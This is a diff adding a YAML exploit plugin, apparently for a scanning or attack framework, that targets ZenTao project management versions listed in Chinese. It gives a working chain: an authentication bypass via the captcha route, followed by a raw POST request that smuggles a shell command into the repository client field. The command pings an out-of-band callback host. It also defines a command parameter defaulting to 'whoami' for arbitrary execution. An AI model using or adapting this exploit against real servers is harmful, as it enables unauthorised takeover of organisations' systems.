@@ -1,0 +1,36 @@
+info:
+    app: zentaopms
+    name: bypass rce
+    author: 小晨曦,Ar3h
+    plugin_version: 1.0.0
+    disclosure_date: "2023-01-06"
+    create_date: "2024-10-08 10:35:12"
+    update_date: "2024-10-08 10:35:12"
+    scope: |-
+        17.4 <= 禅道项目管理系统 <= 18.0.beta1（开源版）
+        7.4 <= 禅道项目管理系统 <= 8.0.beta1（企业版）
+        3.4 <= 禅道项目管理系统 <= 4.0.beta1（旗舰版）
+    description: 禅道项目管理系统中存在身份认证绕过漏洞，未经授权的远程攻击者可利用此漏洞获取系统管理员权限，进一步组合后台命令执行漏洞最终可在目标服务器上注入任意命令，实现未授权接管服务器。
+    detail: 禅道有两种路由模式，路由模式参考：https://xz.aliyun.com/t/8692#toc-7，默认使用的是PATH_INFO模式，POC如下
+    payload: |-
+        1. 权限绕过：/misc-captcha-user
+        2. 后台命令注入：
+        POST /zentao/repo-edit-71633 HTTP/1.1
+        Host: xxx
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: zentaosid=a54d50e79c54ee1a3c03fce3858cf4dd
+        Referer: http://xxx需同Host保持一致
+        Connection: close
+        Content-Length: 60
+        SCM=Subversion&client=ping zentao.k4iaeqbu.eyes.sh%26&path=1
+    reference: https://github.com/0xf4n9x/Zentao-Captcha-RCE
+    vul_type: 代码执行
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
